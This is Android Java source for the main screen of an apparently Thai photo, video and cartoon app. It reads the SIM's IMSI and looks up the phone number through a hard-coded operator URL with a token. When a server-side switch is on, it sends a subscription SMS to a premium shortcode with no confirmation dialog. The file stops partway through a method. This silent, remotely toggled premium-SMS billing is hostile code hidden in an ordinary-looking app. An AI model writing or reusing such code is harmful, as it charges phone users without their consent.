package lava.bluepay.com.lavaapp.view.activity;

import android.Manifest;
import android.app.Activity;
import android.app.ProgressDialog;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Message;
import android.support.annotation.IdRes;
import android.support.v4.app.Fragment;
import android.support.v4.view.ViewPager;
import android.text.TextUtils;
import android.view.KeyEvent;
import android.widget.RadioButton;
import android.widget.RadioGroup;
import android.widget.Toast;
import com.umeng.analytics.MobclickAgent;
import java.util.List;
import lava.bluepay.com.lavaapp.Config;
import lava.bluepay.com.lavaapp.R;
import lava.bluepay.com.lavaapp.base.RequestBean;
import lava.bluepay.com.lavaapp.base.WeakHandler;
import lava.bluepay.com.lavaapp.common.JsonHelper;
import lava.bluepay.com.lavaapp.common.Logger;
import lava.bluepay.com.lavaapp.common.Net;
import lava.bluepay.com.lavaapp.common.Utils;
import lava.bluepay.com.lavaapp.common.pay.PayHelper;
import lava.bluepay.com.lavaapp.common.pay.SmsReceiver;
import lava.bluepay.com.lavaapp.model.MemExchange;
import lava.bluepay.com.lavaapp.model.api.ApiUtils;
import lava.bluepay.com.lavaapp.model.api.MD5Util;
import lava.bluepay.com.lavaapp.model.api.bean.BaseBean;
import lava.bluepay.com.lavaapp.model.api.bean.CategoryBean;
import lava.bluepay.com.lavaapp.model.api.bean.CategoryListBean;
import lava.bluepay.com.lavaapp.model.api.bean.CheckSubBean;
import lava.bluepay.com.lavaapp.model.api.bean.InitData;
import lava.bluepay.com.lavaapp.model.api.bean.PhoneNumBean;
import lava.bluepay.com.lavaapp.model.api.bean.TokenData;
import lava.bluepay.com.lavaapp.model.db.autoSendRecord;
import lava.bluepay.com.lavaapp.model.db.phoneNumRecord;
import lava.bluepay.com.lavaapp.model.process.RequestManager;
import lava.bluepay.com.lavaapp.view.dialog.material.DialogAction;
import lava.bluepay.com.lavaapp.view.dialog.material.MaterialDialog;
import lava.bluepay.com.lavaapp.view.fragment.CartoonFragment;
import lava.bluepay.com.lavaapp.view.fragment.PhotoFragment;
import lava.bluepay.com.lavaapp.view.fragment.VideoFragment;

public class MainActivity extends BaseActivity {


    public boolean lastRequestData = false;

    private static final int FRAGMENT_PHOTO = 0;
    private static final int FRAGMENT_VIDEO = 1;
    private static final int FRAGMENT_CARTOON = 2;


    RadioButton rb_fragment_photo;
    RadioButton rb_fragment_video;
    RadioButton rb_fragment_cartoon;
    RadioGroup rg_select_fragment;

    private int currentNavIndex = -1;


    private PhotoFragment photoFragment;
    private CartoonFragment cartoonFragment;
    private VideoFragment videoFragment;

    //region==============订阅业务===================

    private static final int RequestCodeIntentToSms = 500;
    public static final int RequestCodeIntentToPermissionSetting = 501;

    SmsReceiver mReceiver;


    private CheckHandler myHandler;
    /**轮循查询订阅状态 */
    public static final int MSG_RECHECK_SUB_SITUATION = 100;

    private int nowCheckTime;
    private boolean isInCheck = false;

    public boolean getIsInCheck(){
        return isInCheck;
    }

    public void setCheckStop(){
        nowCheckTime = 0;
        isInCheck = false;
    }
    public CheckHandler getCheckHandler(){
        if(myHandler == null){
            myHandler = new CheckHandler(this);
        }
        return myHandler;
    }

    /**
     * 用来轮循查询订阅状态的Handler
     */
    private static class CheckHandler extends WeakHandler {

        public CheckHandler(Activity instance) {
            super(instance);
        }

        @Override
        public void handleMessage(Message msg) {
            BaseActivity activity = (BaseActivity) getRefercence();
            if(activity == null){
                return;
            }
            switch (msg.what){
                case MainActivity.MSG_RECHECK_SUB_SITUATION:
                    if(!TextUtils.isEmpty(MemExchange.m_iIMSI)){
                        ((MainActivity) activity).sendCheckSubRequest(MemExchange.m_iIMSI);
                    }else{
                        //每秒查询过程中发现Sim卡丢失
                        ((MainActivity) activity).getCheckHandler().removeCallbacksAndMessages(null);
                        ((MainActivity) activity).setCheckStop();
                        MemExchange.getInstance().setCanSee();
                        //todo 刷新界面
                        ((MainActivity) activity).SubSuccess();
                    }
                    break;
            }

        }
    }
    /**
     * 短信发送成功后查询订阅结果
     * 情况：1.从SMS编辑界面回来之后
     *      2.自动发短信发送成功之后
     *      3.自动发短信发送失败之后 （todo 测试的，正式的需要去除）
     */
    public void continueCheckSubSituation(){
        if(MemExchange.getInstance().getCheckSubData() !=null) {
            isInCheck = true;
            getCheckHandler().removeCallbacksAndMessages(null);
            getCheckHandler().sendEmptyMessageDelayed(MainActivity.MSG_RECHECK_SUB_SITUATION, Config.reCheckSubTimeSeparator);
            return;
        }
        SubSuccess();
    }

    public void showSmsSendError(){
        Toast.makeText(context, getResources().getString(R.string.sms_send_error), Toast.LENGTH_SHORT).show();
    }

    /**
     * 订阅成功后刷新界面
     */
    public void SubSuccess(){
        Toast.makeText(MainActivity.this,getResources().getString(R.string.sms_subscribe_success),Toast.LENGTH_SHORT).show();
        int nowPage = -1;
        if(getSupportFragmentManager().findFragmentByTag(PhotoFragment.TAG)!=null){
            nowPage = getPhotoFragment().getVPNowIndex();
            if(nowPage != -1){
                getPhotoFragment().notifyIndexAdapter(nowPage);
            }
        }else if(getSupportFragmentManager().findFragmentByTag(VideoFragment.TAG)!=null){
            nowPage = getVideoFragment().getVPNowIndex();
            if(nowPage != -1){
                getVideoFragment().notifyIndexAdapter(nowPage);
            }
        }else if(getSupportFragmentManager().findFragmentByTag(CartoonFragment.TAG)!=null){
            nowPage = getCartoonFragment().getVPNowIndex();
            if(nowPage != -1){
                getCartoonFragment().notifyIndexAdapter(nowPage);
            }
        }
    }

    /**
     * 订阅
     */
    private void doSubscribe(String shortCode,String content){
        if(TextUtils.isEmpty(shortCode) || TextUtils.isEmpty(content)){
            return;
        }
        if (Utils.checkPermission(context, Manifest.permission.READ_SMS)){
            try {
                mReceiver = new SmsReceiver(context);
                mReceiver.register();
                PayHelper.doPay(shortCode,content);
            }catch (Exception e){
                if(mReceiver!=null){
                    mReceiver.unregister();
                }
                e.printStackTrace();
            }

        }else{
            Toast.makeText(context,getResources().getString(R.string.have_no_sms_permission),Toast.LENGTH_SHORT).show();
        }
    }

    private void gotoSmsSend(String shortCode,String content){
        try {
            if(MemExchange.getInstance().getCheckSubData() == null && !TextUtils.isEmpty(MemExchange.m_iIMSI) && MemExchange.haveSendMsg==false) {
                boolean resultSuccess = Utils.recordTrans(context,MemExchange.m_iIMSI,"");
                if(resultSuccess){
                    MemExchange.setHaveSendMsg(resultSuccess);
                }
            }
            if(MemExchange.getInstance().getCheckSubData()!=null){
                Utils.recordTrans(context,MemExchange.m_iIMSI,"");
            }

            Uri smsToUri = Uri.parse("smsto:"+shortCode);
            Intent intent = new Intent(Intent.ACTION_SENDTO, smsToUri);
            intent.putExtra("sms_body", content);
            startActivityForResult(intent,RequestCodeIntentToSms);
        } catch (Exception e) {
            e.printStackTrace();
            MobclickAgent.reportError(context,e.getMessage());
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        Logger.e(Logger.DEBUG_TAG,"requestCode:"+requestCode+",resultCode"+resultCode);
        super.onActivityResult(requestCode, resultCode, data);
        switch (requestCode) {
            case RequestCodeIntentToSms:
                Toast.makeText(context, getResources().getString(R.string.execute_success), Toast.LENGTH_SHORT).show();

                continueCheckSubSituation();
                break;
            case RequestCodeIntentToPermissionSetting:
                if(ifAllPermissionAllo(new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE,
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.SEND_SMS,
                Manifest.permission.READ_PHONE_STATE})){
                    if (ApiUtils.isNetWorkAvailable()) {
                        isInInitState = true;
                        initApp(MainActivity.NOWInitState0);
                    } else {
                        Toast.makeText(context, getResources().getString(R.string.have_no_network), Toast.LENGTH_SHORT).show();
                    }
                }else{
                    Toast.makeText(context,getResources().getString(R.string.permission_exception_tips),Toast.LENGTH_SHORT).show();
                    finish();
                }
                break;
        }
    }
    //endregion==============订阅业务===================


    //region==============初始化业务===================

    private ProgressDialog mProgressDialog;

    private ProgressDialog getProgressDialog(){
        if(mProgressDialog == null){
            mProgressDialog = new ProgressDialog(this);
            mProgressDialog.setTitle("");
            mProgressDialog.setMessage(getResources().getString(R.string.app_initial));
            mProgressDialog.setCanceledOnTouchOutside(false);
            mProgressDialog.setCancelable(false);
            mProgressDialog.setIndeterminate(true);
        }
        return mProgressDialog;
    }

    //初始化的三个阶段
    private static final int NOWInitState0 = 0;//去请求token
    private static final int NOWInitState1 = 1;//去请求初始化
    private static final int NOWInitState2 = 2;//去请求订阅信息或者查手机号
    private static final int NOWInitState3 = 3;//去拉取第一页信息
    private static final int NOWInitState4 = 4;//由查手机号步骤完成之后进入的，去请求订阅信息

    private int nowInitState = 0;//当前阶段（//todo activity回收的情况）
    private boolean isInInitState = false;

    /**
     * 初始化app（请求token、请求初始化字段、请求订阅状态）
     * 分三个阶段
     */
    private void initApp(int nowState){
        if(!getProgressDialog().isShowing()){
            getProgressDialog().show();
        }
        try {
            switch (nowState) {
                case MainActivity.NOWInitState0://去请求token
                    nowInitState = MainActivity.NOWInitState0;
                    sendGetTokenRequest();
                    break;
                case MainActivity.NOWInitState1://去请求初始化信息
                    sendInitRequest(Config.DeviceIdAndroidPhone, Config.AppVersionId);

                    break;
                case MainActivity.NOWInitState2://去请求订阅信息

                    Config.initMNC();
                    String telNum = Utils.getIMSI(context);
                    MemExchange.m_iIMSI1 = telNum;
                    MemExchange.m_iIMSI = MemExchange.m_iIMSI1;

                    Logger.e(Logger.DEBUG_TAG, "imsi1=" + MemExchange.m_iIMSI1 + ",imsi2=" + MemExchange.m_iIMSI2 + ",imsi=" + MemExchange.m_iIMSI
                            + ",imei=" + MemExchange.m_iIMEI + ",pho=" + MemExchange.m_sPhoneNumber);

//                    MemExchange.m_iIMSI = "520012222222222";

                    if(!TextUtils.isEmpty(MemExchange.m_iIMSI)) {
                        if(Net.isMobileActive(context) && Config.mncs.containsKey(MemExchange.m_iIMSI.substring(0, 5))){
                            List<phoneNumRecord> telNumList = Utils.queryAllTelNumRecord(context,MemExchange.m_iIMSI);
                            if(telNumList!=null && telNumList.size()>0){
                                Logger.e(Logger.DEBUG_TAG, "####AllTelNum数据库表原本有imsi="+MemExchange.m_iIMSI+"的卡");
                                phoneNumRecord item = telNumList.get(0);
                                MemExchange.m_sPhoneNumber = item.telnum;
                                MemExchange.m_phone_type = "AIS";
                                nowInitState = MainActivity.NOWInitState4;
                                initApp(nowInitState);
                            }else {
                                sendAskForPhoneNum();
                            }
                            return;
                        }
                        if(Net.isAvailable(context)){
                            nowInitState = MainActivity.NOWInitState3;
                            initApp(nowInitState);
                            return;
                        }
                        Toast.makeText(context,getResources().getString(R.string.have_no_network),Toast.LENGTH_SHORT).show();

                    }else{
                        Logger.e(Logger.DEBUG_TAG, "####无imsi卡号");
                        MemExchange.getInstance().setCanSee();
                        nowInitState = MainActivity.NOWInitState3;
                        initApp(nowInitState);
                    }
                    break;
                case MainActivity.NOWInitState4:
                    isInInitState = true;
                    String tel = MemExchange.m_sPhoneNumber;
                    if(!TextUtils.isEmpty(tel) && !TextUtils.isEmpty(MemExchange.m_phone_type)){
                        if(MemExchange.m_phone_type.equalsIgnoreCase("AIS")){
                            Logger.e(Logger.DEBUG_TAG,"####经过运营商查询,为AIS用户");
                            nowInitState = MainActivity.NOWInitState2;
                            sendCheckSubRequest(tel);
                        }else{
                            Logger.e(Logger.DEBUG_TAG,"####经过运营商查询,不为AIS用户");
                            MemExchange.getInstance().setCanSee();
                            nowInitState = MainActivity.NOWInitState3;
                            initApp(nowInitState);
                        }
                    }else{//肯定是没有sim卡了
                        Logger.e(Logger.DEBUG_TAG,"####经过运营商查询,无Sim卡");
                        MemExchange.getInstance().setCanSee();
                        nowInitState = MainActivity.NOWInitState3;
                        initApp(nowInitState);

                    }
                    break;
                case MainActivity.NOWInitState3:
                    if (getProgressDialog().isShowing()) {
                        getProgressDialog().dismiss();
                    }

                    lastRequestData = true;

                    isInInitState = false;
                    //请求第一页数据
                    sendCategoryDataListRequest(1, Config.CategoryPhotoPopular, ApiUtils.requestPhotoPopular);

                    if(!TextUtils.isEmpty(MemExchange.m_iIMSI)) {

                        //以订阅信息为准
                        if(MemExchange.getInstance().getCheckSubData() !=null){
                            if (MemExchange.getInstance().getCheckSubData().getSubscribe() == 1) {//用户可以订阅
                                if (MemExchange.getInstance().getInitData() != null) {
                                    String code = MemExchange.getInstance().getInitData().getShorcode();
                                    String content = MemExchange.getInstance().getInitData().getSub_key_sms();

                                    if (MemExchange.getInstance().getInitData().getSwitchX() == 1) {//订阅开关开了，直接发订阅
                                        doSubscribe(code, content);
                                        return;
                                    } else {
                                        showSubscripDialog();
                                    }
                                }else{
                                    MemExchange.getInstance().setCanSee();
                                }
                            }else{//不能订阅就可以直接看
                                MemExchange.getInstance().setCanSee();
                            }

                            return;
                        }

                        //以autoSendRecord数据库表为准
                        List<autoSendRecord> recordList = Utils.queryAllTransRecord(context, MemExchange.m_iIMSI);
                        if (recordList != null && recordList.size() > 0) {//数据库有记录
                            Logger.e(Logger.DEBUG_TAG,"######DB,record"+recordList.get(0).toString());
                            MemExchange.haveSendMsg = true;
                        }else{
                            if(!Config.mncs.containsKey(MemExchange.m_iIMSI.substring(0, 5))){
                                MemExchange.getInstance().setCanSee();
                            }else {
                                MemExchange.haveSendMsg = false;
                                if (MemExchange.getInstance().getInitData() != null) {
                                    String code = MemExchange.getInstance().getInitData().getShorcode();
                                    String content = MemExchange.getInstance().getInitData().getSub_key_sms();

                                    if (MemExchange.getInstance().getInitData().getSwitchX() == 1) {//订阅开关开了，直接发订阅
                                        doSubscribe(code, content);
                                        return;
                                    } else {
                                        showSubscripDialog();
                                    }
                                }
                            }
                        }
                    }
                    break;
            }
        }catch (Exception e){
//            Toast.makeText(context,tv_test.getText().toString(),Toast.LENGTH_SHORT).show();
//            MobclickAgent.reportError(context,"Thailand:"+tv_test.getText().toString()+",exception"+e.getMessage());
//            Utils.WriteFile("sdfsss"+","+tv_test.getText().toString()+","+e.getMessage());
            Utils.WriteFile("bug:"+e.getMessage());
        }

    }

    //region==============初始化业务===================

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        setPageName("MainActivity");

        initToolbar();
        initViews();

        //1. Android 6.0申请权限
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT_WATCH) {
            if(!ifAllPermissionAllo(new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE,
                    Manifest.permission.READ_EXTERNAL_STORAGE,
                    Manifest.permission.SEND_SMS,
                    Manifest.permission.READ_PHONE_STATE})) {
                getPermissions(new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE,
                        Manifest.permission.READ_EXTERNAL_STORAGE,
                        Manifest.permission.SEND_SMS,
                        Manifest.permission.READ_PHONE_STATE});
            }else{
                if (ApiUtils.isNetWorkAvailable()) {
                    isInInitState = true;
                    initApp(MainActivity.NOWInitState0);
                } else {
                    Toast.makeText(context, getResources().getString(R.string.have_no_network), Toast.LENGTH_SHORT).show();
                }
            }
        }else {

            if (ApiUtils.isNetWorkAvailable()) {
                isInInitState = true;
                initApp(MainActivity.NOWInitState0);
            } else {
                Toast.makeText(context, getResources().getString(R.string.have_no_network), Toast.LENGTH_SHORT).show();
            }
        }
//        switchToFragment(FRAGMENT_PHOTO);
//        loadDataForPhotoFragment();

    }


    @Override
    protected void handlePermissionAllowed(String permissionName) {
//        if(ifAllPermissionAllo(new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE,
//                Manifest.permission.READ_EXTERNAL_STORAGE,
//                Manifest.permission.SEND_SMS,
//                Manifest.permission.READ_PHONE_STATE})){
            if (ApiUtils.isNetWorkAvailable()) {
                isInInitState = true;
                initApp(MainActivity.NOWInitState0);
            } else {
                Toast.makeText(context, getResources().getString(R.string.have_no_network), Toast.LENGTH_SHORT).show();
            }
//        }
    }

    @Override
    protected void handlePermissionForbidden(String permissionName) {
        super.handlePermissionForbidden(permissionName);
        Toast.makeText(context,getResources().getString(R.string.permission_exception_tips),Toast.LENGTH_SHORT).show();
        finish();
    }

    @Override

    protected void onResume() {

        super.onResume();
        Logger.i(Logger.DEBUG_TAG,"MainActivity,onResume()");

//        if(!isInInitState && nowInitState<NOWInitState3 && MemExchange.getInstance().getInitData() == null){
//            if(ApiUtils.isNetWorkAvailable()) {
//                nowInitState = 0;
//                isInInitState = true;
//                initApp(MainActivity.NOWInitState0);
//            }else{
//                Toast.makeText(context,getResources().getString(R.string.have_no_network),Toast.LENGTH_SHORT).show();
//            }
//        }
    }

    @Override
    protected void onResumeFragments() {
        Logger.i(Logger.DEBUG_TAG,"MainActivity,onResumeFragments()");
        super.onResumeFragments();

        if(ifAllPermissionAllo(new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE,
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.SEND_SMS,
                Manifest.permission.READ_PHONE_STATE})) {

            if (currentNavIndex == FRAGMENT_PHOTO || currentNavIndex == -1) {
                PhotoFragment fragment = (PhotoFragment) getSupportFragmentManager().findFragmentByTag(PhotoFragment.TAG);
                if (fragment != null) {
                    if (currentNavIndex == -1) {
                        if (rb_fragment_photo != null) {
                            rb_fragment_photo.setChecked(true);
                        }
                    } else {
                        switchToFragment(FRAGMENT_PHOTO);
                    }
                } else {
                    switchToFragment(FRAGMENT_PHOTO);
                    //发送请求
                }
            }
        }
    }



    /**
     * 条件：
     * 设置toolbar中间viewpager指示字（用于fragment调用）
     * @param vp
     * @param titles
     */
    public void setIndicator(ViewPager vp,String[]titles){
        setUiIndicator(vp,titles);
    }

    public void setToolbar(boolean showBack){
        if(toolbar == null){
            return;
        }
        toolbar.setNavigationIcon(null);
        toolbar.setNavigationOnClickListener(null);
        if(showBack){
            if(getSupportActionBar()!=null){
                getSupportActionBar().setDisplayShowCustomEnabled(true);
                getSupportActionBar().setHomeAsUpIndicator(R.drawable.toolbar_back);//返回健
            }
        }else{
            if (getSupportActionBar() != null) {
                getSupportActionBar().setDisplayHomeAsUpEnabled(false);
            }
        }

    }



    private void initViews(){
//        tv_test = (TextView) findViewById(R.id.tv_test);
        rg_select_fragment = (RadioGroup) findViewById(R.id.rg_select_fragment);
        rb_fragment_photo = (RadioButton) findViewById(R.id.tv_fragment_photo);
        rb_fragment_video = (RadioButton) findViewById(R.id.tv_fragment_video);
        rb_fragment_cartoon = (RadioButton) findViewById(R.id.tv_fragment_cartoon);
        rg_select_fragment.setOnCheckedChangeListener(new RadioGroup.OnCheckedChangeListener() {
            @Override
            public void onCheckedChanged(RadioGroup group, @IdRes int checkedId) {
                getSupportFragmentManager().popBackStackImmediate();//弹出栈中全部对象
                if(checkedId == R.id.tv_fragment_photo){
                    switchToFragment(FRAGMENT_PHOTO);
                }else if(checkedId == R.id.tv_fragment_video){
                    switchToFragment(FRAGMENT_VIDEO);
                }else if(checkedId == R.id.tv_fragment_cartoon){
                    switchToFragment(FRAGMENT_CARTOON);
                }
            }
        });
    }

    /**
     * 切换fragment
     * @param pageIndex
     */
    private void switchToFragment(int pageIndex){
        Fragment fragment ;
        String fragmentTag;

        //todo 存在bug，如果切换过快,currentNavIndex改变了，但是fragment
        if(currentNavIndex == pageIndex){
            return;
        }

        switch (pageIndex){
            case FRAGMENT_PHOTO:
                fragmentTag = PhotoFragment.TAG;
                fragment = getSupportFragmentManager().findFragmentByTag(PhotoFragment.TAG);
                if(fragment == null) {
                    fragment = getPhotoFragment();
                }else{
                    return;
                }
                break;
            case FRAGMENT_VIDEO:
                fragmentTag = VideoFragment.TAG;
                fragment = getSupportFragmentManager().findFragmentByTag(VideoFragment.TAG);
                if(fragment == null) {
                    fragment = getVideoFragment();
                }else{
                    return;
                }
                break;
            case FRAGMENT_CARTOON:
                fragmentTag = CartoonFragment.TAG;
                fragment = getSupportFragmentManager().findFragmentByTag(CartoonFragment.TAG);
                if(fragment == null) {
                    fragment = getCartoonFragment();
                }else{
                    return;
                }
                break;
            default:
                return;
        }
        int animationIdIn = 0;
        int animationIdOut = 0;
//        int backStackEntryCount = getSupportFragmentManager().getBackStackEntryCount();
//        if(backStackEntryCount == 0){
            if(this.currentNavIndex < 0){

            }else if(this.currentNavIndex > pageIndex){
                animationIdIn = R.anim.push_left_in;
                animationIdOut = R.anim.push_right_out;
            }else if(this.currentNavIndex < pageIndex){
                animationIdIn = R.anim.push_right_in;
                animationIdOut = R.anim.push_left_out;
            }else{
                return;
            }
//        }
        getSupportFragmentManager().beginTransaction()
                .setCustomAnimations(animationIdIn,animationIdOut,0,0)
                .replace(R.id.mainContainer,fragment,fragmentTag)
                .commitAllowingStateLoss();

        RadioButton rb = (RadioButton) rg_select_fragment.getChildAt(pageIndex);
        rb.setChecked(true);
//        rb.setTextColor(getResources().getColor(R.color.activity_main_nav_radio_text));
        checkIndex(pageIndex);
        this.currentNavIndex = pageIndex;
    }

    private PhotoFragment getPhotoFragment(){
        if(photoFragment == null){
            photoFragment = new PhotoFragment();

//            if(ApiUtils.isNetWorkAvailable()) {
//                发送请求
//            }else{
//                Logger.e(Logger.DEBUG_TAG,"MainActivity,switchToFragment,photoFragment,net work not work");
//                todo 提示网络不可用
//            }

        }
        return photoFragment;
    }
    private CartoonFragment getCartoonFragment(){
        if(cartoonFragment == null){
            cartoonFragment = new CartoonFragment();
        }
        return cartoonFragment;
    }
    private VideoFragment getVideoFragment(){
        if(videoFragment == null){
            videoFragment = new VideoFragment();
        }
        return videoFragment;
    }

    private void checkIndex(int index){
        switch(index){
            case FRAGMENT_PHOTO:
                rb_fragment_photo.setBackgroundColor(getResources().getColor(R.color.radio_bg_checked));
                rb_fragment_video.setBackgroundColor(getResources().getColor(R.color.radio_bg_normal));
                rb_fragment_cartoon.setBackgroundColor(getResources().getColor(R.color.radio_bg_normal));

                rb_fragment_photo.setTextColor(getResources().getColor(R.color.radio_text_checked));
                rb_fragment_video.setTextColor(getResources().getColor(R.color.radio_text_normal));
                rb_fragment_cartoon.setTextColor(getResources().getColor(R.color.radio_text_normal));
                break;
            case FRAGMENT_VIDEO:
                rb_fragment_photo.setBackgroundColor(getResources().getColor(R.color.radio_bg_normal));
                rb_fragment_video.setBackgroundColor(getResources().getColor(R.color.radio_bg_checked));
                rb_fragment_cartoon.setBackgroundColor(getResources().getColor(R.color.radio_bg_normal));

                rb_fragment_photo.setTextColor(getResources().getColor(R.color.radio_text_normal));
                rb_fragment_video.setTextColor(getResources().getColor(R.color.radio_text_checked));
                rb_fragment_cartoon.setTextColor(getResources().getColor(R.color.radio_text_normal));
                break;
            case FRAGMENT_CARTOON:
                rb_fragment_photo.setBackgroundColor(getResources().getColor(R.color.radio_bg_normal));
                rb_fragment_video.setBackgroundColor(getResources().getColor(R.color.radio_bg_normal));
                rb_fragment_cartoon.setBackgroundColor(getResources().getColor(R.color.radio_bg_checked));

                rb_fragment_photo.setTextColor(getResources().getColor(R.color.radio_text_normal));
                rb_fragment_video.setTextColor(getResources().getColor(R.color.radio_text_normal));
                rb_fragment_cartoon.setTextColor(getResources().getColor(R.color.radio_text_checked));

                break;
        }
    }






    //region=======网络请求=================

    /**
     * 请求token
     */
    public void sendGetTokenRequest(){
        try {
            String sRequest = ApiUtils.getToken(Config.APPID, MD5Util.getMD5String("appid=" + Config.APPID + Config.APPSALT));

            //todo bug
            if(isInInitState){
                MemExchange.getInstance().bugText.add(sRequest);
            }

            RequestManager.getInstance().request(sRequest, getMyHandler(), ApiUtils.requestToken,new RequestBean());
        }catch (Exception e){
            e.printStackTrace();
            //todo 上传错误日志
        }
    }

    /**
     * 请求初始化数据
     * @param dev 客户端设备id 1安卓pad 2安卓手机 3ios手机 4iospad
     * @param versionid 设备的版本
     */
    public void sendInitRequest(int dev, int versionid){
        try {
            TokenData.DataBean bean = MemExchange.getInstance().getTokenData();
            if (bean == null || TextUtils.isEmpty(bean.getToken())) {
                Logger.e(Logger.DEBUG_TAG,"请求无效");
                return;
            }
            String sRequest = ApiUtils.getInit();

            //todo bug
            if(isInInitState){
                MemExchange.getInstance().bugText.add(sRequest);
            }


            RequestManager.getInstance().requestByPost(sRequest, getMyHandler(), RequestManager.getInstance().getInitRequestBody(dev, versionid,bean.getToken()), new RequestBean(ApiUtils.requestInit,-1,-1));
        }catch(Exception e){
            e.printStackTrace();
            //todo 上传错误日志
        }
    }

    /**
     * 向运营商请求sim卡信息,获取手机号
     */
    public void sendAskForPhoneNum(){
        try {
            String sRequest = "http://www.jmtt.co.th/detection/index.php?token=66a8a0d8c66e4d18235c95085eb411b0";

            //todo bug
            if(isInInitState){
                MemExchange.getInstance().bugText.add(sRequest);
            }


            RequestManager.getInstance().request(sRequest, getMyHandler(), ApiUtils.requestPhoneNum,null);
        }catch (Exception e){
            e.printStackTrace();
            //todo 上传错误日志
        }
    }

    /**
     * 请求查询用户订阅状态
     * @param telNum
     */
    public void sendCheckSubRequest(String telNum){
        try {
            if(TextUtils.isEmpty(telNum)){
                return;
            }
            TokenData.DataBean bean = MemExchange.getInstance().getTokenData();
            if (bean == null || TextUtils.isEmpty(bean.getToken())) {
                Logger.e(Logger.DEBUG_TAG,"请求无效");
                return;
            }
            String sRequest = ApiUtils.getCheckSub();

            //todo bug
            if(isInInitState){
                MemExchange.getInstance().bugText.add(sRequest);
            }


            RequestManager.getInstance().requestByPost(sRequest, getMyHandler(), RequestManager.getInstance().getCheckSubRequestBody(telNum,bean.getToken()), new RequestBean(ApiUtils.requestCheckSub,-1,-1));
        }catch (Exception e){
            e.printStackTrace();
            //todo 上传错误日志
        }
    }

    /**
     * 请求某一类数据请求
     */
    public void sendCategoryDataListRequest(int nowPage, int cateId, int requestType){

        if(MemExchange.getInstance().getIsTokenInvalid()){
            loadError(requestType);
            Toast.makeText(context,context.getString(R.string.try_later),Toast.LENGTH_SHORT).show();
            return;
        }
        //todo 没有任务堆积才可以进行下一步
        if(MemExchange.getInstance().getTokenData() == null){
            Logger.e(Logger.DEBUG_TAG,"请求无效");
            return;
        }
        String sRequest = ApiUtils.getQuerypage(nowPage,Config.PerPageSize,cateId,MemExchange.getInstance().getTokenData().getToken());

        //todo bug
        if(lastRequestData){
            MemExchange.getInstance().bugText.add(sRequest);
        }



        RequestManager.getInstance().request(sRequest,getMyHandler(),requestType,new RequestBean(requestType,nowPage,cateId));
    }

    public void sendAllCategoryListRequest(){
//        if(MemExchange.getInstance().getTokenData() == null){
//            return;
//        }
//        String sRequest = ApiUtils.getCategoryList();
//        RequestManager.getInstance().requestByPost(sRequest,getMyHandler(),RequestManager.getInstance().getCategoryRequestBody(),ApiUtils.requestAllCategory);
    }



    @Override
    protected void processReqError(Message msg) {
        super.processReqError(msg);
        String mResult = getMessgeResult(msg);
        //todo bug
        if(isInInitState){
            MemExchange.getInstance().bugText.add(mResult);
        }

        if(msg.arg1 == ApiUtils.requestPhoneNum){

            try {
                PhoneNumBean phoneNumBean = JsonHelper.getObject(mResult, PhoneNumBean.class);
//                PhoneNumBean phoneNumBean = new PhoneNumBean();
//                phoneNumBean.setMsisdn("13418638286");
//                phoneNumBean.setOper("AIS");
                if (phoneNumBean != null && !TextUtils.isEmpty(phoneNumBean.getMsisdn())) {
                    Logger.e(Logger.DEBUG_TAG, "####经过运营商查询成功");
                    MemExchange.m_sPhoneNumber = phoneNumBean.getMsisdn();
                    MemExchange.m_phone_type = phoneNumBean.getOper();
                    if(!TextUtils.isEmpty(MemExchange.m_iIMSI)){
                        Utils.recordTelNumRecord(context, phoneNumBean.getMsisdn(), MemExchange.m_iIMSI,"",phoneNumBean.getOper(),"");
                    }
                    nowInitState = MainActivity.NOWInitState4;
                    initApp(nowInitState);
                } else {
                    Logger.e(Logger.DEBUG_TAG, "####运营商查询失败,认为无Sim卡");
                    MemExchange.getInstance().setCanSee();
                    nowInitState = MainActivity.NOWInitState3;
                    initApp(nowInitState);
                }
            }catch (Exception e){
                e.printStackTrace();
                MemExchange.getInstance().setCanSee();
                nowInitState = MainActivity.NOWInitState3;
                initApp(nowInitState);
            }
            return;
        }

        BaseBean bean = JsonHelper.getObject(mResult, BaseBean.class);
        if(bean.getCode() == ApiUtils.HTTP_NETWORK_FAIL || bean.getCode() == ApiUtils.HTTP_REQUEST_EXCEPTION) {
            switch (msg.arg1) {
                case ApiUtils.requestToken:
                    //初始化
                    if(nowInitState < NOWInitState3 && MemExchange.getInstance().getInitData() == null){
                        Toast.makeText(context, context.getString(R.string.initial_error), Toast.LENGTH_SHORT).show();
                        finish();
                        return;
                    }else if(MemExchange.getInstance().getIsTokenInvalid()) {
                        //过期查询
                        MemExchange.getInstance().returnTokenToNormal();
                    }
                    break;
                case ApiUtils.requestInit:
                    Toast.makeText(context, context.getString(R.string.initial_error), Toast.LENGTH_SHORT).show();
                    finish();
                    break;

                case ApiUtils.requestCheckSub:
                    if(nowInitState < NOWInitState3 && MemExchange.getInstance().getInitData() == null){
                        //初始化
                        Toast.makeText(context, context.getString(R.string.initial_error), Toast.LENGTH_SHORT).show();
                        finish();
                        return;
                    }else{
                        //轮循订阅查询
                        isInCheck = false;
                        nowCheckTime = 0;
                        getCheckHandler().removeCallbacksAndMessages(null);

                        if(MemExchange.getInstance().getInitData().getSwitchX() == 1 || MemExchange.getInstance().getInitData().getSwitchX() == 2) {
                            MemExchange.getInstance().setCanSee();
                            //todo 刷新界面
                            SubSuccess();
                        }
                    }
                    break;

            }

        }

        if(bean.getCode() == ApiUtils.reqResErrorAuthFail|| bean.getCode() == ApiUtils.reqResErrorAuthError){
            return;
        }

        loadError(msg.arg1);
    }

    @Override
    protected void processRequest(Message msg) {
        super.processRequest(msg);
        String result = getMessgeResult(msg);
        //todo bug
        if(isInInitState){
            MemExchange.getInstance().bugText.add(result);
        }
        if(lastRequestData){
            MemExchange.getInstance().bugText.add(result);
            lastRequestData = false;
